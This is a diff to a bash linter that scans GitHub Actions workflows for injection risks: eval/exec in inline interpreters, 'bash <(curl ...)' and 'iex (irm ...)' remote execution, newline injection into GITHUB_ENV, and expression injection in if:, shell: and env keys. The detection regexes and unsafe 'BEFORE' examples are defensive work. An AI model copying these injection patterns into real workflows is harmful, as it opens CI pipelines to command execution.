-            if ($0 ~ /(pwsh|powershell)([^[:alnum:]_]|$)/ && $0 ~ /(-Command|-c)/ && $0 ~ /Invoke-Expression/) { print; return }
+            if ($0 ~ /node([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(eval[[:space:]]*\(|new[[:space:]]+Function[[:space:]]*\(|vm\.(runInNewContext|runInThisContext|Script)[[:space:]]*\()/) { print NR; return }
+            if ($0 ~ /python3?([^[:alnum:]_]|$)/ && $0 ~ /-c/ && $0 ~ /(^|[^[:alnum:]_])(eval|exec)[[:space:]]*\(/) { print NR; return }
+            if ($0 ~ /perl([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(^|[^[:alnum:]_])eval([^[:alnum:]_]|$)/) { print NR; return }
+            if ($0 ~ /ruby([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(^|[^[:alnum:]_])eval[[:space:]]*\(/) { print NR; return }
+            if ($0 ~ /php([^[:alnum:]_]|$)/ && $0 ~ /-r/ && $0 ~ /(^|[^[:alnum:]_])eval[[:space:]]*\(/) { print NR; return }
+            if ($0 ~ /(pwsh|powershell)([^[:alnum:]_]|$)/ && $0 ~ /(-Command|-c)/ && $0 ~ /Invoke-Expression/) { print NR; return }
         }
         /^[[:space:]]*(-[[:space:]]+)?run:/ { check_line(); next }
         in_run_block { check_line() }
     ' "${file}" 2>/dev/null)
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Inline interpreter command uses eval/exec-style dynamic code execution in run: block - avoid executing constructed code"
+        log_issue "HIGH" "${file}" "Inline interpreter command uses eval/exec-style dynamic code execution in run: block - avoid executing constructed code" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -1802,6 +2203,11 @@ check_40_severity="HIGH"
 
 example_check_40() {
     cat <<'EOF'
+# WHY: child_process functions (execSync, spawn, exec) execute shell commands
+# from JavaScript. When actions/github-script reads runtime input via
+# core.getInput() or process.env and passes it to these functions, the
+# attacker's data becomes a shell command — full command injection.
+#
 # BEFORE (unsafe - runtime input is executed as a shell command):
   uses: actions/github-script@v7
   with:
@@ -1866,7 +2272,9 @@ check_40() {
             END { flush_script() }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "actions/github-script combines runtime input/env data with child_process command execution APIs - command injection risk"
+            local script_lines
+            script_lines=$(grep -nE 'actions/github-script' "${file}" 2>/dev/null || true)
+            log_issue "HIGH" "${file}" "actions/github-script combines runtime input/env data with child_process command execution APIs - command injection risk" "$(_extract_lines "${script_lines}")"
             return 1
         fi
     fi
@@ -1881,6 +2289,11 @@ check_41_severity="HIGH"
 
 example_check_41() {
     cat <<'EOF'
+# WHY: Patterns like  python -c "subprocess.run(os.environ['X'], shell=True)"
+# or  node -e "execSync(process.env.X)"  execute env-var contents as shell
+# commands. Even though the value was passed safely via an env block (not
+# ${{ }}), the interpreter re-elevates it from data back to code.
+#
 # BEFORE (unsafe - env/input is executed through a shell):
   env:
     USER_CMD: ${{ inputs.payload }}
@@ -1896,13 +2309,13 @@ check_41() {
     local file="$1"
     local unsafe_usage
     unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-        /^[[:space:]]*(-[[:space:]]+)?run:/ { print; next }
-        in_run_block { print }
+        /^[[:space:]]*(-[[:space:]]+)?run:/ { print NR ":" $0; next }
+        in_run_block { print NR ":" $0 }
     ' "${file}" 2>/dev/null | grep -E \
         'node([^[:alnum:]_]|$).*-e.*(execSync|exec|spawnSync|spawn|execFileSync|execFile)[[:space:]]*\(|python3?([^[:alnum:]_]|$).*-c.*(subprocess\..*shell=True|os\.system\()|ruby([^[:alnum:]_]|$).*-e.*(^|[^[:alnum:]_])(system|exec|spawn|Open3\.capture2e|Open3\.capture3)[[:space:]]*\(|perl([^[:alnum:]_]|$).*-e.*(^|[^[:alnum:]_])(system|exec)([^[:alnum:]_]|$)|php([^[:alnum:]_]|$).*-r.*(shell_exec|exec|system|passthru|proc_open)[[:space:]]*\(' \
         || true)
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Inline interpreter command uses shell/process execution APIs in run: block - avoid executing runtime data as commands"
+        log_issue "HIGH" "${file}" "Inline interpreter command uses shell/process execution APIs in run: block - avoid executing runtime data as commands" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -1916,6 +2329,11 @@ check_42_severity="HIGH"
 
 example_check_42() {
     cat <<'EOF'
+# WHY: "bash -c "$VARIABLE"" or "sh -c "$VARIABLE"" executes the variable's
+# contents as a shell command. If the variable was set from untrusted input
+# (even safely via an env block), this pattern converts data back into code,
+# defeating the env-var mitigation entirely.
+#
 # BEFORE (unsafe - variable contents are executed as shell code):
   env:
     USER_CMD: ${{ inputs.payload }}
@@ -1932,13 +2350,13 @@ check_42() {
     local unsafe_usage
     # shellcheck disable=SC2016
     unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-        /^[[:space:]]*(-[[:space:]]+)?run:/ { print; next }
-        in_run_block { print }
+        /^[[:space:]]*(-[[:space:]]+)?run:/ { print NR ":" $0; next }
+        in_run_block { print NR ":" $0 }
     ' "${file}" 2>/dev/null | grep -E \
         '(^|[[:space:]])(ba)?sh[[:space:]]+-c[[:space:]]+["'\'']?\$[A-Za-z_][A-Za-z0-9_]*|(^|[[:space:]])(zsh|dash|ksh)[[:space:]]+-c[[:space:]]+["'\'']?\$[A-Za-z_][A-Za-z0-9_]*|(^|[[:space:]])(pwsh|powershell)[[:space:]]+(-Command|-c)[[:space:]]+["'\'']?\$env:[A-Za-z_][A-Za-z0-9_]*' \
         || true)
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Shell command is executed from a variable via *sh -c or PowerShell -Command - this treats runtime data as code"
+        log_issue "HIGH" "${file}" "Shell command is executed from a variable via *sh -c or PowerShell -Command - this treats runtime data as code" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -1952,6 +2370,11 @@ check_43_severity="HIGH"
 
 example_check_43() {
     cat <<'EOF'
+# WHY: "bash <(curl ...)" and PowerShell "iex (irm ...)" download and execute
+# remote code in a single operation, just like "curl | bash". The process-
+# substitution variant is harder to grep for but equally dangerous — no
+# integrity verification occurs before execution.
+#
 # BEFORE (unsafe - remote script executed via process substitution / IEX):
   run: bash <(curl -sSL https://example.com/install.sh)
   # or
@@ -1968,13 +2391,13 @@ check_43() {
     local file="$1"
     local unsafe_usage
     unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-        /^[[:space:]]*(-[[:space:]]+)?run:/ { print; next }
-        in_run_block { print }
+        /^[[:space:]]*(-[[:space:]]+)?run:/ { print NR ":" $0; next }
+        in_run_block { print NR ":" $0 }
     ' "${file}" 2>/dev/null | grep -E \
         '(bash|sh|zsh|ksh)[[:space:]]+<\([[:space:]]*(curl|wget)[^)]*\)|(^|[[:space:]])(\.|source)[[:space:]]+<\([[:space:]]*(curl|wget)[^)]*\)|(pwsh|powershell).*((-Command|-c).*)?(iex|Invoke-Expression)[[:space:]]*\((irm|iwr|Invoke-RestMethod|Invoke-WebRequest)[[:space:]]+' \
         || true)
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Remote content is executed directly via process substitution or PowerShell IEX/IRM - download and verify first"
+        log_issue "HIGH" "${file}" "Remote content is executed directly via process substitution or PowerShell IEX/IRM - download and verify first" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -1988,23 +2411,62 @@ check_44_severity="HIGH"
 
 example_check_44() {
     cat <<'EOF'
-# BEFORE (unsafe - attacker-controlled value can inject extra env/path/output entries):
+# GITHUB_ENV / GITHUB_OUTPUT / GITHUB_PATH use newlines as record
+# delimiters: each entry is  key=value\n  (one line per variable).
+#
+# The trailing newline from  printf '%s\n'  is the *record terminator* —
+# it tells GitHub Actions where one entry ends and the next begins.
+# That newline is required and safe.
+#
+# The danger is a newline *embedded inside the value*.  If an attacker-
+# controlled value contains \n, it terminates the current record early
+# and starts a new one, injecting an arbitrary key=value pair:
+#
+#   VALUE="legit\nMALICIOUS_VAR=pwned"
+#   printf '%s\n' "FOO=${VALUE}" >> "${GITHUB_OUTPUT}"
+#   # writes two records:
+#   #   FOO=legit
+#   #   MALICIOUS_VAR=pwned        <-- injected by attacker
+#
+# BEFORE (unsafe - attacker-controlled value can inject extra entries):
   env:
     EXTRA_PATH: ${{ inputs.extra-path }}
   run: echo "${EXTRA_PATH}" >> "${GITHUB_PATH}"
-# AFTER (safer - validate before writing, or use a trusted constant):
+# AFTER (safer - reject embedded newlines, then write with printf):
   env:
     EXTRA_PATH: ${{ inputs.extra-path }}
   run: |
-    [[ "${EXTRA_PATH}" == /opt/tools/* ]] || exit 1
+    if [[ "${EXTRA_PATH}" == *$'\n'* ]] || [[ "${EXTRA_PATH}" == *$'\r'* ]]; then
+      echo "::error::EXTRA_PATH contains newlines"; exit 1
+    fi
     printf '%s\n' "${EXTRA_PATH}" >> "${GITHUB_PATH}"
 EOF
 }
 
 check_44() {
     local file="$1"
+
+    # Determine which source patterns are dangerous for this file.
+    # For composite actions, workflow_call-only, and workflow_dispatch-only
+    # workflows, inputs.* and steps/needs outputs come from trusted callers
+    # (repo collaborators), so only flag github.event.*, github.head_ref,
+    # github.base_ref.
+    local has_untrusted_inputs=1
+    if grep -qE '^\s*using:\s*["\047]?composite' "${file}" 2>/dev/null; then
+        has_untrusted_inputs=0
+    else
+        # Check if the file has any truly untrusted triggers
+        local has_dangerous_trigger=0
+        if grep -qE '^\s*(pull_request|pull_request_target|issues|issue_comment|repository_dispatch):' "${file}" 2>/dev/null; then
+            has_dangerous_trigger=1
+        fi
+        if [[ "${has_dangerous_trigger}" -eq 0 ]]; then
+            has_untrusted_inputs=0
+        fi
+    fi
+
     local unsafe_usage
-    unsafe_usage=$(awk '
+    unsafe_usage=$(awk -v check_inputs="${has_untrusted_inputs}" '
         BEGIN {
             in_step = 0
             step_indent = -1
@@ -2057,11 +2519,22 @@ check_44() {
         in_env {
             if (curr_indent <= env_indent && $0 ~ /^[[:space:]]*[A-Za-z_-]+:/) {
                 in_env = 0
-            } else if ($0 ~ /^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*:[[:space:]]*\$\{\{.*(inputs\.|github\.event\.|github\.head_ref|github\.base_ref|matrix\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.|secrets\.)/) {
-                line = $0
-                sub(/^[[:space:]]*/, "", line)
-                split(line, parts, ":")
-                dangerous_env[parts[1]] = 1
+            } else {
+                is_dangerous = 0
+                # Always flag github.event.*, github.head_ref, github.base_ref
+                if ($0 ~ /\$\{\{.*(github\.event\.|github\.head_ref|github\.base_ref)/) {
+                    is_dangerous = 1
+                }
+                # Only flag inputs/matrix/steps/needs/secrets for untrusted workflows
+                if (check_inputs == "1" && $0 ~ /\$\{\{.*(inputs\.|matrix\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.|secrets\.)/) {
+                    is_dangerous = 1
+                }
+                if (is_dangerous && $0 ~ /^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*:[[:space:]]*\$\{\{/) {
+                    line = $0
+                    sub(/^[[:space:]]*/, "", line)
+                    split(line, parts, ":")
+                    dangerous_env[parts[1]] = 1
+                }
             }
         }
         in_step && /^[[:space:]]*run:[[:space:]]*\|/ {
@@ -2071,26 +2544,37 @@ check_44() {
         }
         in_step && /^[[:space:]]*run:/ {
             if ($0 ~ /GITHUB_(ENV|PATH|OUTPUT)/ && line_uses_dangerous_var($0)) {
-                print
+                print NR
             }
             next
         }
         in_run_block {
             if ($0 ~ /^[[:space:]]*-[[:space:]]/) {
                 in_run_block = 0
+                has_validation = 0
                 next
             }
             if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[A-Za-z_-]+:/) {
                 in_run_block = 0
+                has_validation = 0
                 next
             }
+            # Detect validation patterns (newline checks, regex validation)
+            if ($0 ~ /validate_no_newlines|\\n.*\\r|newline|exit 1/ && $0 !~ /GITHUB_(ENV|PATH|OUTPUT)/) {
+                has_validation = 1
+            }
+            if ($0 ~ /=~.*\^\[/ || $0 ~ /\[\[.*!~/) {
+                has_validation = 1
+            }
             if ($0 ~ /GITHUB_(ENV|PATH|OUTPUT)/ && line_uses_dangerous_var($0)) {
-                print
+                if (!has_validation) {
+                    print NR
+                }
             }
         }
     ' "${file}" 2>/dev/null)
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT - newline injection can create unintended entries"
+        log_issue "HIGH" "${file}" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT - newline injection can create unintended entries" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -2104,6 +2588,11 @@ check_45_severity="HIGH"
 
 example_check_45() {
     cat <<'EOF'
+# WHY: GitHub Actions if: conditions support native expressions without ${{ }}
+# wrapping. When ${{ }} IS used, the expression is first string-interpolated
+# then evaluated, so attacker-controlled values can alter the boolean logic
+# (e.g., injecting  ' || true || '  to force a condition to pass).
+#
 # BEFORE (unsafe - attacker-controlled data in conditional logic):
   if: contains('${{ github.event.pull_request.title }}', 'build')
   run: echo "This step runs conditionally"
@@ -2120,13 +2609,28 @@ check_45() {
     local found=0
 
     # Check for if: conditions with attacker-controlled expressions
-    # Look for if: containing ${{ with github.event or inputs contexts
+    # Only flag if: conditions that use ${{ }} wrapping (native expressions without
+    # ${{ }} are safe since they're not subject to string interpolation injection).
+    # Also skip inputs.* if the workflow only has workflow_call triggers (trusted callers).
     local dangerous_if
-    dangerous_if=$(grep -nE '^[[:space:]]*if:.*\$\{\{.*(github\.event\.(pull_request|issue|comment|discussion|review|release)|inputs\.|client_payload|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null || true)
+    dangerous_if=$(grep -nE '^[[:space:]]*if:.*\$\{\{.*(github\.event\.(pull_request|issue|comment|discussion|review|release)|client_payload|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null || true)
 
     if [[ -n "${dangerous_if}" ]]; then
-        log_issue "HIGH" "${file}" "'if:' condition contains attacker-controlled expression interpolation - can manipulate workflow logic"
+        log_issue "HIGH" "${file}" "'if:' condition contains attacker-controlled expression interpolation - can manipulate workflow logic" "$(_extract_lines "${dangerous_if}")"
         found=1
+    fi
+
+    # Check inputs.* separately - only flag if the workflow has untrusted triggers
+    # (workflow_dispatch, pull_request_target, etc.), not just workflow_call
+    local inputs_in_if
+    inputs_in_if=$(grep -nE '^[[:space:]]*if:.*\$\{\{.*inputs\.' "${file}" 2>/dev/null || true)
+    if [[ -n "${inputs_in_if}" ]]; then
+        local has_untrusted_input_trigger
+        has_untrusted_input_trigger=$(grep -cE '^\s*(workflow_dispatch|repository_dispatch):' "${file}" 2>/dev/null || echo "0")
+        if [[ "${has_untrusted_input_trigger}" -gt 0 ]]; then
+            log_issue "HIGH" "${file}" "'if:' condition contains attacker-controlled input expression interpolation - can manipulate workflow logic" "$(_extract_lines "${inputs_in_if}")"
+            found=1
+        fi
     fi
 
     [[ ${found} -eq 0 ]]
@@ -2140,6 +2644,11 @@ check_46_severity="HIGH"
 
 example_check_46() {
     cat <<'EOF'
+# WHY: ${{ inputs['user-command'] }} and ${{ github.event['pull_request']['title'] }}
+# access the same values as dot notation but may bypass security scanners that
+# only look for dot-notation patterns. The injection risk is identical — the
+# value is still textually expanded into the shell command.
+#
 # BEFORE (unsafe - bracket notation bypasses dot-notation detection):
   run: echo "${{ inputs['user-command'] }}"
   run: echo "${{ github.event['pull_request']['title'] }}"
@@ -2166,7 +2675,7 @@ check_46() {
         }
         /^[[:space:]]*(-[[:space:]]+)?run:/ {
             if (/\$\{\{/) {
-                print
+                print NR ":" $0
             }
             next
         }
@@ -2174,12 +2683,12 @@ check_46() {
             if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_run_block = 0; next }
             match($0, /^[[:space:]]*/); curr_indent = RLENGTH
             if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_run_block = 0; next }
-            print
+            print NR ":" $0
         }
     ' "${file}" 2>/dev/null | grep -E '\$\{\{[^}]*\[' || true)
 
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Uses bracket notation for expression in run block - can bypass dot-notation detection"
+        log_issue "HIGH" "${file}" "Uses bracket notation for expression in run block - can bypass dot-notation detection" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -2193,6 +2702,11 @@ check_47_severity="HIGH"
 
 example_check_47() {
     cat <<'EOF'
+# WHY: Beyond the commonly audited fields (PR title/body, issue body), many
+# other github.event.* fields are attacker-controlled: release.body,
+# client_payload.*, inputs.* (from dispatch), pusher.name/email, forkee.*,
+# etc. These all undergo the same ${{ }} expansion and can inject commands.
+#
 # BEFORE (unsafe - additional event fields not covered by check 16):
   run: echo "${{ github.event.release.body }}"
   run: echo "${{ github.event.inputs.command }}"
@@ -2217,11 +2731,11 @@ check_47() {
     if grep -qE "${additional_fields}" "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)/ { print; next }
-            in_run_block && /github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)/ { print NR; next }
+            in_run_block && /github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains additional attacker-controlled github.event field directly in run: block - use env var instead"
+            log_issue "HIGH" "${file}" "Contains additional attacker-controlled github.event field directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -2236,6 +2750,12 @@ check_48_severity="HIGH"
 
 example_check_48() {
     cat <<'EOF'
+# WHY: "export VAR="${{ inputs.* }}"" creates an env var that propagates to
+# all child processes in the step. Unlike a step-level env: block (set by the
+# runner before macro expansion), export in a run: block means the value was
+# already ${{ }}-expanded into shell source — combining injection risk with
+# broad propagation to every subprocess.
+#
 # BEFORE (unsafe - export creates env var from attacker input that propagates):
   run: |
     export BUILD_DIR="${{ inputs.build-dir }}"
@@ -2256,12 +2776,12 @@ check_48() {
 
     local unsafe_usage
     unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-        /^[[:space:]]*(-[[:space:]]+)?run:/ && /export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{/ { print; next }
-        in_run_block && /export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{/ { print }
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{/ { print NR; next }
+        in_run_block && /export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{/ { print NR }
     ' "${file}" 2>/dev/null)
 
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Export statement contains direct \${{ }} interpolation - exported variable propagates to child processes"
+        log_issue "HIGH" "${file}" "Export statement contains direct \${{ }} interpolation - exported variable propagates to child processes" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -2275,6 +2795,11 @@ check_49_severity="MEDIUM"
 
 example_check_49() {
     cat <<'EOF'
+# WHY: The shell: property determines which interpreter runs the step's code.
+# If an attacker controls this value, they can specify an arbitrary binary as
+# the shell (e.g., a script they uploaded as an artifact), gaining code
+# execution in the job's security context.
+#
 # BEFORE (unsafe - shell property controlled by attacker input):
   run: echo "hello"
   shell: ${{ inputs.custom_shell }}
@@ -2293,7 +2818,7 @@ check_49() {
     unsafe_usage=$(grep -nE "${shell_pattern}" "${file}" 2>/dev/null || true)
 
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "MEDIUM" "${file}" "'shell:' property contains expression interpolation - can execute arbitrary shell commands"
+        log_issue "MEDIUM" "${file}" "'shell:' property contains expression interpolation - can execute arbitrary shell commands" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -2307,6 +2832,11 @@ check_50_severity="HIGH"
 
 example_check_50() {
     cat <<'EOF'
+# WHY: ${{ env.MY_VAR }} is macro-expanded into the shell script at workflow-
+# parse time, before the shell runs. The env var's value becomes shell source
+# code, not a quoted string. The safe equivalent ${MY_VAR} is expanded by the
+# shell at runtime and treated as data.
+#
 # BEFORE (unsafe - env variable is macro-expanded into shell code before execution):
   run: echo "${{ env.MY_VAR }}"
 # AFTER (safe - reference as shell variable):
@@ -2319,11 +2849,11 @@ check_50() {
     if grep -qE '\$\{\{.*env\.' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*env\./ { print; next }
-            in_run_block && /\$\{\{.*env\./ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*env\./ { print NR; next }
+            in_run_block && /\$\{\{.*env\./ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains \${{ env.* }} directly in run: block - use shell variable like \$ENV_VAR instead to prevent injection"
+            log_issue "HIGH" "${file}" "Contains \${{ env.* }} directly in run: block - use shell variable like \$ENV_VAR instead to prevent injection" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -2338,6 +2868,11 @@ check_51_severity="HIGH"
 
 example_check_51() {
     cat <<'EOF'
+# WHY: github.ref and github.ref_name contain the branch or tag name that
+# triggered the workflow. In PRs, the branch name is controlled by the PR
+# author, who can include shell metacharacters (backticks, $(), semicolons).
+# When expanded via ${{ }} into a run block, these become executable shell syntax.
+#
 # BEFORE (unsafe - tag or branch name can contain shell metacharacters):
   run: echo "Ref: ${{ github.ref_name }}"
 # AFTER (safe - shell variable is not re-parsed):
@@ -2352,11 +2887,11 @@ check_51() {
     if grep -qE '\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)' "${file}" 2>/dev/null; then
         local unsafe_usage
         unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)/ { print; next }
-            in_run_block && /\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)/ { print }
+            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)/ { print NR; next }
+            in_run_block && /\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)/ { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "Contains github.ref or github.ref_name interpolation directly in run: block - use env var instead"
+            log_issue "HIGH" "${file}" "Contains github.ref or github.ref_name interpolation directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -2371,6 +2906,11 @@ check_52_severity="HIGH"
 
 example_check_52() {
     cat <<'EOF'
+# WHY: When the env var *key* (not just value) is a ${{ }} expression, an
+# attacker can set arbitrary environment variable names. This enables env-var
+# pollution attacks — injecting LD_PRELOAD, BASH_ENV, PATH, or other
+# security-sensitive variables that alter program behavior.
+#
 # BEFORE (unsafe - attacker controls env var name, enabling env pollution):
   env:
     ${{ inputs.env_name }}: ${{ inputs.env_value }}
@@ -2382,31 +2922,39 @@ EOF
 
 check_52() {
     local file="$1"
-    # Look for env blocks with expression interpolation in variable names
+    # Look for env blocks where the variable NAME (key) itself is an expression.
+    # This is distinct from having expressions in values (which is normal).
+    # Pattern: env block where a line starts with ${{ (the key is dynamic).
     local unsafe_env_names
     unsafe_env_names=$(awk '
         /^[[:space:]]*env:/ {
             in_env = 1
-            env_indent = -1
+            env_indent = length($0) - length(ltrim($0))
             next
         }
-        in_env && /^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*:/ {
-            # Regular env var assignment (safe)
-            next
-        }
-        in_env && /^[[:space:]]*\$\{\{/ {
-            # Dynamic env var name via expression (unsafe)
-            print
-            next
-        }
-        in_env && /^[[:space:]]*[a-zA-Z_-]+:/ && !/^env:/ {
-            # Exit env block when we hit another top-level key
-            in_env = 0
+        function ltrim(s) { sub(/^[[:space:]]+/, "", s); return s }
+        in_env {
+            # Calculate current indent
+            cur = $0
+            sub(/[^[:space:]].*/, "", cur)
+            cur_indent = length(cur)
+
+            # Exit env block if indent decreases to or below env: level
+            if (NF > 0 && cur_indent <= env_indent && !/^[[:space:]]*$/) {
+                in_env = 0
+                next
+            }
+
+            # Only flag lines where the KEY itself is a ${{ expression
+            # i.e., the line starts (after indent) with ${{ before any colon
+            if (/^[[:space:]]*\$\{\{[^}]*\}\}[[:space:]]*:/) {
+                print NR
+            }
         }
     ' "${file}" 2>/dev/null)
 
     if [[ -n "${unsafe_env_names}" ]]; then
-        log_issue "HIGH" "${file}" "Contains dynamic environment variable names via expression interpolation - can lead to environment variable pollution attacks"
+        log_issue "HIGH" "${file}" "Contains dynamic environment variable names via expression interpolation - can lead to environment variable pollution attacks" "$(_extract_lines "${unsafe_env_names}")"
         return 1
     fi
     return 0
@@ -2463,7 +3011,8 @@ run_check() {
 
 format_results() {
     local results_file="$1"
-    local -A checks_with_issues=()
+    # Use delimited string instead of associative array for bash 3.2 compat
+    local _seen_checks="|"
     local total_issues=0
 
     if [[ ! -f "${results_file}" ]]; then
@@ -2472,8 +3021,7 @@ format_results() {
     fi
 
     # First pass: print all issues, track which checks had failures
-    # Read each line whole (IFS=) then split on tab via parameter expansion to
-    # avoid the IFS=$'\t' corner case where read silently drops empty fields.
+    # Machine output format: CHECK<tab>SEVERITY<tab>FILE<tab>LINES<tab>MESSAGE
     while IFS= read -r _line; do
         [[ -z "${_line}" ]] && continue
         check="${_line%%$'\t'*}"
@@ -2481,21 +3029,41 @@ format_results() {
         severity="${_rest%%$'\t'*}"
         _rest="${_rest#*$'\t'}"
         file="${_rest%%$'\t'*}"
+        _rest="${_rest#*$'\t'}"
+        lines="${_rest%%$'\t'*}"
         message="${_rest#*$'\t'}"
         [[ -z "${check}" ]] && continue
+
+        # Re-apply NOLINT filtering (defense-in-depth for parallel results)
+        if [[ -n "${lines}" ]] && [[ -f "${file}" ]]; then
+            lines=$(_filter_nolint "${lines}" "${file}" "${check}")
+            [[ -z "${lines}" ]] && continue
+        fi
+
+        local file_display="${file}"
+        if [[ -n "${lines}" ]]; then
+            file_display="${file}:${lines}"
+        fi
 
         local color="${YELLOW}"
         if [[ "${severity}" == "CRITICAL" ]] || [[ "${severity}" == "HIGH" ]]; then
             color="${RED}"
         fi
-        printf '%b[%s]%b %s: %s\n' "${color}" "${severity}" "${NC}" "${file}" "${message}"
+        printf '%b[%s]%b %s: %s\n' "${color}" "${severity}" "${NC}" "${file_display}" "${message}"
 
-        checks_with_issues["${check}"]=1
+        case "${_seen_checks}" in
+            *"|${check}|"*) ;;
+            *) _seen_checks="${_seen_checks}${check}|" ;;
+        esac
         total_issues=$((total_issues + 1))
     done < "${results_file}"
 
     # Second pass: print one example per unique failed check
-    for check_num in "${!checks_with_issues[@]}"; do
+    local _remaining="${_seen_checks#|}"
+    while [[ -n "${_remaining}" ]]; do
+        local check_num="${_remaining%%|*}"
+        _remaining="${_remaining#*|}"
+        [[ -z "${check_num}" ]] && continue
         local example_fn="example_check_${check_num}"
         if declare -f "${example_fn}" > /dev/null 2>&1; then
             local example_output
